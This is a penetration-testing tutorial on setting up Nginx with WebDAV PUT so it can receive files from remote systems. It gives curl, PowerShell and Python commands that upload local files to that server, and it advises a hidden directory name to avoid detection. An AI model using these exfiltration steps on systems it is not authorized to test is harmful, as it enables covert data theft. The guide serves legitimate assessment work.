# Catching Files over HTTP/S

This guide demonstrates how to configure Nginx to accept file uploads using the HTTP PUT method. This is useful for receiving files from remote systems during penetration testing or security assessments.

## Summary

1. [Prerequisites](#prerequisites)
2. [Create Upload Directory](#create-upload-directory)
3. [Configure Nginx](#configure-nginx)
4. [Enable the Configuration](#enable-the-configuration)
5. [Restart Nginx Service](#restart-nginx-service)
6. [Upload Files](#upload-files)

## Prerequisites

- Nginx installed and running
- Root or sudo access
- Basic understanding of Nginx configuration

## Create Upload Directory

First, create a directory to store uploaded files:

```bash
# Create Directory to handle Uploaded File
sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change Owner to www-data (Nginx user)
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

# Set appropriate permissions (optional, for security)
sudo chmod 755 /var/www/uploads/SecretUploadDirectory
```

**Note:** The directory name `SecretUploadDirectory` can be changed to any name you prefer. Using a non-obvious name can help avoid detection.

## Configure Nginx

Create a new Nginx configuration file for the upload server:

```bash
sudo nano /etc/nginx/sites-available/upload.conf
```

Add the following configuration:

```conf
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

**Configuration Explanation:**
- `listen 9001;` - Nginx listens on port 9001
- `location /SecretUploadDirectory/` - Matches requests to the `/SecretUploadDirectory/` path
- `root /var/www/uploads;` - Sets the root directory for file storage
- `dav_methods PUT;` - Enables the PUT method for file uploads

**Note:** You may need to install the `nginx-extras` package if the `dav_methods` directive is not available:
```bash
sudo apt install nginx-extras
```

## Enable the Configuration

Create a symbolic link to enable the site:

```bash
# Create symlink to enable the site
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/

# Test Nginx configuration for syntax errors
sudo nginx -t
```

## Restart Nginx Service

Apply the changes by restarting Nginx:

```bash
sudo systemctl restart nginx.service

# Verify Nginx is running
sudo systemctl status nginx.service
```

## Upload Files

Once configured, you can upload files using various methods:

### Using cURL

```bash
# Upload a file using PUT method
curl -X PUT http://<server-ip>:9001/SecretUploadDirectory/filename.txt -T /path/to/local/file.txt

# Upload with authentication (if configured)
curl -X PUT -u username:password http://<server-ip>:9001/SecretUploadDirectory/filename.txt -T /path/to/local/file.txt
```

### Using PowerShell

```powershell
# Upload a file using Invoke-WebRequest
Invoke-WebRequest -Uri "http://<server-ip>:9001/SecretUploadDirectory/filename.txt" -Method Put -InFile "C:\path\to\local\file.txt"
```

### Using Python

```python
import requests

url = "http://<server-ip>:9001/SecretUploadDirectory/filename.txt"
with open('/path/to/local/file.txt', 'rb') as f:
    response = requests.put(url, data=f)
    print(response.status_code)
```

## Security Considerations

- **Firewall Rules:** Ensure port 9001 is accessible if needed, or use a different port
- **Authentication:** Consider adding HTTP Basic Authentication for production use
- **HTTPS:** For secure transfers, configure SSL/TLS certificates
- **File Size Limits:** Add `client_max_body_size` directive to limit upload size
- **Access Control:** Restrict access using IP whitelisting if possible

## Troubleshooting

- **Check Nginx logs:** `sudo tail -f /var/log/nginx/error.log`
- **Verify directory permissions:** Ensure `www-data` user has write access
- **Test configuration:** `sudo nginx -t` before restarting
- **Check port availability:** `sudo netstat -tlnp | grep 9001`